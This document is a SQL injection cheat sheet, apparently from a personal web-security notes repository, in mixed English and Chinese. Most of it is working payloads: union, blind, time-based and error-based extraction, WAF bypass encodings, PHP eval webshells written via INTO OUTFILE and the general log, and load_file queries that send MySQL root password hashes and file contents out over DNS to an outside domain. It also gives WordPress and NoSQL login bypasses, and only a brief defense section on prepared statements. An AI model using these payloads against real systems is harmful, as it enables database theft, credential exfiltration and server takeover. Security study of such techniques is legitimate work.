# SQL injection  
SQL is a famous database engine which is used with web server. In this situation, we can inject some SQL based code to get what we want <3.  
[Remember, practice makes perfect!](http://www.tutorialspoint.com/mysql_terminal_online.php)  
*  [Basic](#basic-injection)  
*  [Union based](#union-based)  
*  [Blind based](#blind-based)  
*  [Error based](#error-based)  
*  [Waf bypass](#waf-bypass)  
*  [Write Webshell](#webshell)  
*  [Read file](#read-file)  
*  [sql privilege issue](#sql-privilege-issue)  
*  [Bypass ASPX RequestValidation](#bypass-requestvalidation-on-aspx)  
*  [Wordpress4.8.2 double prepare](#wordpress-double-prepare-misuse)  
*  [NoSQL injection](#nosql-injection)  
*  [Logic Vulnerability](#logic-vulnerability)  
*  [Tools](#tools)  
*  [Defense](#defense)  
*  [Reference](#reference)

# Basic injection  
select password from users where name = '$id';  
So, what can we insert into $id?  
```sql  
5566 or 1=1 --  
5566; drop table hello  // execute drop table on second line  

rafael' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  
rafael' or ''='    // select password from users where name = 'rafael' or ''='';

// bypass length limit
'||1#     // logic op dont need space char
'^0#
'|0#
```  

# Union based
1. Vulnerable to SQL injection?  
```sql
1' or 1"  
```  
2. union with **same number** of columns  
```sql
// N+=1, until page cannot show
1' order by N#
```  
3. make sure the place of our injection point  
```sql
//  1,2 number will show on the inj point 
1' and 1=2 union select 1,2...N#
```  
4. make sure for some basic information  
```sql
union select user(),database(),version(), @@version_compile_os--+
```  
5. start our exciting part  
```sql
...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // get all database name
```  

```sql
...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
// table_schema can also show with hex
```  

```sql
...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
// table_schema would be better:)...
```  

```sql
1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
// separate
1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // separate with *
```  

[What's in information_schema.columns?](https://dev.mysql.com/doc/refman/5.7/en/columns-table.html)  
**group_concat() is also a little trick.**

# Blind based  
result is not showed on the page and there is also no any error message.  
**True**: page shows normal.  
**False**: page shows error or no any result.  
**Boolean based**  
```sql
length(str)
substr(str,pos,len)   // index starts from 1
mid(str,pos,len)
ascii(str)    // we will get decimal, ord()
if(a,b,c)   // if a is true, it will return b, or otherwise return c
id=1' and ascii(substr((select database()),1,1))>65--+  // ascii from 32~127
// work with syntax
and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
```  
boolean based depends on **whether page show things**...  

**Time based**  
```sql
id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // if the first char is not bigger than s, then delay 5s
```
Blind-based costs lot of time, so script is necessary for us!  

👽 **DNS injection**  
The process of bruteforce still takes much time. If we inject a domain name in our payload to force it to be parsed, we might get our data efficiently from dns log.  
MySQL:  
```php
select load_file( concat('\\\\', (select password from mysql.user where user='root' limit 1), '.www.example.com\\abc') );
```  
The limitation of the method above would be talked about in [Read file](#read-file) part.  

# Error based
* Analyze the error message  
```sql
My payload: ?id = 2'
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''2'') LIMIT 0,1' at line 1
```
When we see the word such like **near** and **at**，we can delete the single quote at the left side and right side. The left part should be: `'  2'  ') LIMIT 0,1`  
Therefore，our exploit should be: `') or 1=1--+`  
* Double injection
```sql
/**
we need:
count()            
concat()            // the primary key which is collided would be showed in error message，so we should concat our target to the primary key
floor(), rand()
group by
**/
?id = 1' union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
// After we understand how it works completely，we can also modify our payload such like following:
?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
```  
`floor(rand()x2)` has many same members in the list，and it causes to the collision of `group by key`! (I recommend the following article so much  
  [The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)  
* Integer Overflow  
`exp()` will cause to error when the version of sql is bigger than 5.5.5  
```sql
exp(~(select*from(select user())a));  // the result of the query inside is 0, we will get 18446744073709551615 after the operation of (~), and exp(710) will cause to overflow!
// What is the a at the end? It is alias. We need to assign an alias to subquery (select*from)
```  

`select` can also return the result of the query，it will return 0 if if the query is bigger than 0，and will return 1 if the result is 0 (very important!  
[The recommended article](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/)  
* xpath syntax error  
`extractvalue()`,`updatexml()` can work on the xml syntax which is provided by the user  
```sql
?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
?id=1" or/and select extractvalue(rand(),concat(0x3a,@@basedir))#
// Due to the error of xml syntax，database() will also show in the error message

and extracvalue(rand(),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1))#
where table_schema=0xXXXXX

// Some trick
// If the injection point is after the word limit e.g. order by name limit {$_GET[1]}, 10
?1=select id from users where id>5 order by name limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
// ERROR 1105 (HY000): XPATH syntax error: ':10.1.26-MariaDB'
```

# WAF bypass
WAF is a defender for web.  
Tricks:  
- I want to login  
  - `id=1' or 1 like 1#`  
  - `') or '1'=1--`  
- Space bypass 
  - `select/**/username/**/from/**/users;`  
  - `select@{backtick}id{backtick}`(I wrap it with {} due to markdown syntax here)  
  - `union select 1,2` -> `union(select(1),2)`  
  - `%20 %09(tab) %0a(line feed) %0b %0c %0d %a0 /**/` -> `id=1%0aand%0aip=2`  
  - aspx+mssql `%00`, php+mysql `/*%00*/`
- Obfuscation with Upper Lowercase  
  - `SelecT`  
- Obfuscation with wrap  
  - `UNIunionON`  
- Inline comments(**It is useful to bypass waf in realworld**)  
  - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`  
- Comma bypass  
  - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
  - in use of limit `limit 1 offset 0`  
  - in use of mid() `mid(version() from 1 for 1)`
- Encoding(or double) bypass  
  - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
  - `unicode(quote): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
  - `unicode(space): %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0`  
  - `unicode(left bracket): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
  - `unicode(right bracket): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
  - `Char(49)` `Hex('a')` `Unhex(61)`  
  - On asp+iis, server can parse the unicode automatically, `%` in url would be ignored, it means `s%u0065lect` would be parsed as 'select'  
  - `IBM037`,`IBM500`,`IBM1026`,`cp875` and so on, take a look at [bypass waf with encoding](#bypass-requestvalidation-on-aspx)  
- Comment 
  - `#`    
  - `--+` `--` `-- -`  
  - `/* ... */` `///**/`(multiple lines)  
  - {backtick} can be used as comment if  mysql <= 5.5  
  - `;` stacking queries cannot be used in mysql query+php, but it works in PDO  
- Command bypass  
  - `sleep()` -> `benchmark()`  
  - `@@datadir` -> `datadir()`  
- Logic operator  
  - `and/or` -> `&& / |`  
- Wide-Character injection  
  - bypass single quote： `%bf%27 %df%27 %aa%27`  
- keyword `information_schema` bypass  
  - get database name：`select * from users where name = helloworld();`  
    `ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
- HPP on asp  
  - When GET/POST/COOKIE submit `uid` at the same time, server would follow the order of GET/POST/COOKIE to receive and split them with comma  
  - Exploit: `http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
- Function separator  
  - In fact, there can be something between function name and the left bracket, this can be used to bypass regex  
  - function `/**/`,`%2520`,`%250c`,`%25a0` ()  

More：  
[seebug我的wafbypass之道](https://paper.seebug.org/218/)  

# Webshell
:racehorse: Select `into outfile` requires write-permission from users, file should **not be already exist**, and without the limitation of `secure_file_priv`.  
```sql
1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // absolute path
// into outfile must be used with double quote

// injection after limit
into outfile 'D:/1.php' lines terminiated/starting by 0x3c3f7068702070687069e666f28293b3f3e;
```  
Guess the path of document root...  
```php
// Window server IIS asp server
C:\inetpub\www\root\
// linux server nginx
/usr/local/nginx/html, /home/www/root/default, /usr/share/nginx, /var/www/html
// linux apache
/var/www/html, /var/www/html/htdocs

// guess from other results...  
// @@basedir : sql installation path
// @@datadir : database path
id=1' union select 1, @@basedir, @@datadir--+
```
e.g. With @@basedir we can get the result of ```C:/xampp/mysql```, and document root might be ```C:/xampp/htdocs/```, more content can be taken a look at [INFO-leak](https://github.com/shinmao/Web-Security-Learning/tree/master/INFO-leak) The part of absolute path  
:racehorse: Webshell with general log  
Requirement is also **write-permission**, general log would record your history command  
Scene: Attackers are confused by **read-permission**  
```php
show variables like '%general%';
set global general_log=on;
set global general_log_file='/var/www/html/myshell.php';
```  
Open the log setting, set to the place you want your webshell, and pay attention to the default place of `general_log_file`  
```php
select '<?php @eval($_POST[1])?>';
```  
End, change `general_log_file` back to the default place, set `general_log` back to off  

# Read file  
```php
union select load_file( filename-hex );

// DNS query
select load_file(concat('\\\\',hex((select load_file('want_to_read_file'))),'example.com\\file.txt'));
```  
Attackers or users require read-permission(usually have). We can use `load_file` to read some information, for example `DB.php`. In addition to read-permission，`select into outfile`,`select into dumpfile`,`select load_file()` such functions are all limited by `secure_file_priv`, take a look at the following part...  

# SQL Privilege issue  
We always run into the SQL privilege issue when we want to write webshell or read other files. Each time attaching, server will check db_user authentication, server can also be set to **limit the attachment from external ip**. If bypass authentication，admin can also limit the command can be used by users。  
[Ref:Mysql privilege issue](https://www.cnblogs.com/Richardzhu/p/3318595.html)  
The limitation of `--secure_file_priv` on read write permission:  
mysql setting of `--secure_file_priv` limit the path of writting files, with `select @@secure_file_priv` we can get the value. Before 5.7.5, the dafault value is **Empty**, and user don't need to worry about permission. In following version, the default value is set to NULL, the tricks such as `select into` even becomes garbage because `@@secure_file_priv` is more difficult to **set** than `general_log`, `@@secure_file_priv` can't be changed when mysql is exec  
[Ref:關於mysql中select into outfile權限的探討](https://blog.csdn.net/bnxf00000/article/details/64123549)  

# Bypass RequestValidation on ASPX
![image](https://farm2.staticflickr.com/1829/43302939171_78fbb87eba_h.jpg)  
Request Validation is the mechanism of ASP to check the malicious request，and it defaults to block even the common html tag，but we can customize the rules of Request Validation or check by ourselves  
From the image above, we can find that many server support IBM037,IBM500,IBM1026,cp875，we can get the encoded string with following script  
```python
import urllib
payload = 'xxx'
print urllib.quote_plus(payload.encode("IBM500"))
```  
Take `QueryString` for example，he can receive the GET parameter from request  
```php
// Appsec Europe sqlinj challenge
On Error Resume Next

If Not Request.QueryString("uid").Contains("'") Then
  ...SELECT name FROM users WHERE uid = Request.QueryString("uid")...
  Response.Write(Query)
Else
  Response.Write("You fail")
End If
```
Apparently，this challenge prevent us from injecting with single quote，but how can we close the single quote to achieve injection...  
![](https://farm1.staticflickr.com/921/42585039264_b5874cc629_h.jpg)  
Exploit:  
第一次`QueryString`時發生了error，但卻因為`On Error Resume Next`而繼續執行下去，第二次`QueryString`時就通過了，這還需要切換Request Method  
若payload在`QueryString`裡 -> `POST`  
若payload在`body`裡 -> `GET`  
除了上面`HTTP Verb Replacement`和`Charset`特殊字集，還有`change body type`,`remove unnecessary part`,`add unuseful part`等方法，細節在這邊先不贅述...  
* 防禦方式：  
果然編碼的攻擊方式還是很強大，我們可以透過限制charset的值來避免這種攻擊方式  
[Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
[Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  

# Wordpress Double Prepare Misuse  
Wordpress自己寫了`prepare()`預編譯sql語句然後再`execute()`，有別於PDO下的`prepare()`,`blind()`,`execute()`。這是出現在wordpress4.8.3以前的版本的問題...  
```php
$query = $wpdb->prepare( "SELECT * FROM table WHERE column = %s", $_GET['c1'] );
$wpdb->query( $query );
```  
若我注入`1' or '1'='1`，`prepare()`會用單引號將它包起來置入query語句，並且轉譯單引號。`SELECT * FROM table WHERE column = ' 1\' or \'1\'=\'1 '`，無解...但是如果開發者今天這樣寫的話...  
```php
$query = $wpdb->prepare( "SELECT * FROM table WHERE column1 = %s", $_GET['c1'] );
$query = $wpdb->prepare( $query . " AND column2 = %s", $_GET['c2'] );
$wpdb->query( $query );

// c1=%s&c2[]=or 1=1--&c2[]=a
執行結果
prepare1: SELECT * FROM table WHERE column1 = '%s' AND column2 = %s;
prepare2: SELECT * FROM table WHERE column1 = ' 'or 1=1--' ' AND column2 = 'a';
```  
原因出在prepare()的檢查步驟，我們沒有輸入`'`，而是讓prepare()自己輸入單引號來協助我們閉合...  
在Wordpress4.8.3的版本之後，patch成使用者輸入的`%`會被取代為66bytes的秘密字串：`{xxxxx...xxx}s`  
  
# NoSQL injection
MongoDB parse the data with a format just likes json.  
Therefore, we cannot inject with string, but use `{key:value}` this kind of format to do injection.  
```sql
// The list of regex
$gt: >
$lt: <
$gte: >=
$lte: <=
$ne: not equal
$in: in
$nin: not in
$not:
$or

// expression of query
db.table_name.find({"column_name":value});      // where column = value
db.table_name.find({"column":{$reg:value}});    // where column $reg value
```  
Login first to find other hints
```sql
?username[$ne]=\&password[$ne]=\
```
Blind injection  
```sql
?username=admin&password[$regex]=^a
```  

# Logic Vulnerability  
對sql觀念的誤解很容易讓開發者犯了一些邏輯漏洞，下面做一些收集：  
1. mysql整型  
在mysql裡若字段為整型，`where`語句中的值不為整型時，會先被轉換成整型才進行語句查詢...  
```php
select a from user where id='0a';
select a from user where id='0';
```  
若a col為int型態，id值會由字串轉換為int在進行查詢，因此`id='0a'`的結果和`id='0'`的結果會一樣...  
[遇到一個有趣的邏輯漏洞](https://www.leavesongs.com/PENETRATION/findpwd-funny-logic-vul.html)

# Tools
* [Mysql Online Terminal](http://www.tutorialspoint.com/mysql_terminal_online.php)  

# Defense
為何會發生sql injection呢？原因是我們的輸入修改了原本的語意，而導致重編譯...  
這邊就得先了解一下sql parser是怎麼運作的，當收到我們的輸入後開始進入了編譯的四階段：  
1. 詞法分析：辨別是否為關鍵字，我們稱帶有關鍵字的語句為token[閱讀 詞法分析](https://segmentfault.com/a/1190000015568992)  
2. 語法分析：辨認關鍵字，並以AST做成語法樹  
3. 檢測內容  
4. 語意辨識  

語意辨識完了之後就是**選用執行計畫**，最後才執行(一般編譯過後會放入plan cache，這樣下次同樣的語句就不用重編譯，而是重用執行計畫，大部分的注入都是因為我們沒有用原先的執行計畫...)  
所以說為什麼prepare statement能夠防範注入呢？prepare所進行的是預編譯，這時不會把使用者輸入的值放入資料庫執行，搭配參數化查詢(正確使用)的話，我們就能重用執行計畫並且完美地避免sql注入  
這邊還要注意`PDO::prepare`的用法，PDO內建一個叫`ATTR_EMULATE_PREPARES`的模擬器，預設情況下是**true**，在PDO的模擬器中完成預處理與參數化查詢，再根據字符集處理後才送給mysql。我們必須把他設為**false**，他才會分兩次傳給mysql執行！

🎅SQLChop可以說防禦了99%的sql注入，因為他對參數執行了詞法語法分析。不管payload再怎樣變化，只要經過sql原生的詞法語法分析後發現多個token，而他是個有效的語句，那就會被偵測到!  

# Reference
* [Personal article - first time meet with NoSQL](https://shinmao.github.io/2018/03/01/My-First-NoSQL/)  
* [Joy__nick 新手神器](http://www.cnblogs.com/joy-nick/p/5774462.html)
